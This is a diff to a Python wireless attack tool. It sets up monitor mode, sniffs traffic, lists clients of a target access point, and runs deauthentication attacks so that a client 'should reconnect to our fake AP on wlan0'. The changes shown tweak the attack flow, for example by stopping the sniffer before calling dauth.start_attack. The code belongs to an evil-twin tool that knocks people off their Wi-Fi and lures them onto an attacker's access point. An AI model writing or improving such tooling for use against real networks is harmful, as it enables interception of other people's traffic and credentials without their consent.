@@ -32,8 +32,8 @@ def signal_handler(sig, frame):
 
 
 def main():
-    sigint = signal.signal(signal.SIGINT, signal_handler)
-    sigterm = signal.signal(signal.SIGTERM, signal_handler)
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
 
     iface = network.select_interface()
 
@@ -47,6 +47,8 @@ def main():
     except subprocess.CalledProcessError as e:
         print(f"[ERROR] Failed to set up monitor mode: {e}")
         sys.exit(1)
+
+    time.sleep(1)
 
     print("[*] Starting network monitoring...")
     sniff_thread = threading.Thread(target=network.start_sniff, args=(iface,), daemon=True)
@@ -92,6 +94,7 @@ def main():
 
                     # Client menu
                     while True:
+                        #network.start_sniff()
                         client_list = clients.get(target_bssid, {})
 
                         if not client_list:
@@ -180,6 +183,8 @@ def main():
                                         print(f"\n[*] Deauthing client {client_mac} for {ONE_MINUTE_SCAN} seconds...")
                                         print(f"[*] Using {deauth_interface} for deauth attacks")
                                         print("[*] Client should reconnect to our fake AP on wlan0")
+
+                                        network.stop_sniffing()
 
                                         dauth.start_attack(client_mac, target_bssid, deauth_interface, ONE_MINUTE_SCAN)
 
